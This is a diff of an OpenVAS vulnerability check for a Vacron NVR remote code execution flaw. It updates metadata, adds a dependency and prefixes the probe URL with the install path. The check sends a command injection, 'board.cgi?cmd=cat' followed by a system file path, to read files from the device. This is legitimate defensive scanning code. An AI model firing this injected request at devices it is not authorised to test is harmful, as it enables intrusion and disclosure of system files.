@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_vacron_nvr_rce_vuln.nasl 11672 2018-09-28 10:48:17Z jschulte $
+# $Id: gb_vacron_nvr_rce_vuln.nasl 11826 2018-10-10 14:38:27Z cfischer $
 #
 # Vacron NVR Remote Code Execution Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:vacron:nvr";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.107187");
-  script_version("$Revision: 11672 $");
+  script_version("$Revision: 11826 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-09-28 12:48:17 +0200 (Fri, 28 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-10 16:38:27 +0200 (Wed, 10 Oct 2018) $");
   script_tag(name:"creation_date", value:"2017-10-11 10:31:53 +0200 (Wed, 11 Oct 2017)");
   script_name("Vacron NVR Remote Code Execution Vulnerability");
 
@@ -61,7 +61,7 @@ if(description)
   script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
-  script_dependencies("gb_vacron_nvr_detect.nasl");
+  script_dependencies("gb_vacron_nvr_detect.nasl", "os_detection.nasl");
   script_mandatory_keys("vacron_nvr/installed");
   script_require_ports("Services/www", 8080);
 
@@ -73,8 +73,9 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
 
-if (!port = get_app_port(cpe: CPE))
-  exit(0);
+if(!port = get_app_port(cpe: CPE)) exit(0);
+if(!dir = get_app_location(cpe: CPE, port: port)) exit(0);
+if(dir == "/") dir = "";
 
 files = traversal_files();
 
@@ -82,10 +83,9 @@ foreach pattern(keys(files)) {
 
   file = "/" + files[pattern];
 
-  url = "/board.cgi?cmd=cat%20" + file;
+  url = dir + "/board.cgi?cmd=cat%20" + file;
 
   if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
-
     report = report_vuln_url(port: port, url: url) ;
     security_message(port: port, data: report);
     exit(0);
